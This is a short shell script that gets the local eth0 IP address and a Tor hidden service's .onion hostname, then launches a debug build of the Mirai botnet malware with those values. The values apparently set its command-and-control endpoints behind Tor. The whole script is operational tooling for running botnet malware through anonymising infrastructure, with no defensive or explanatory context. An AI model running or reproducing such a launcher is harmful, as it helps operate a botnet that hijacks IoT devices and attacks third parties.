IP=`ifconfig eth0 | grep 'inet ' | cut -dt -f2 | awk '{ print $1}'`
HSNAME=`ls tor/ | grep HS`
ONION=`cat "tor/$HSNAME/hs/hostname"`
echo $ONION $IP
./mirai.dbg $ONION $IP $ONION 0 127.0.0.1

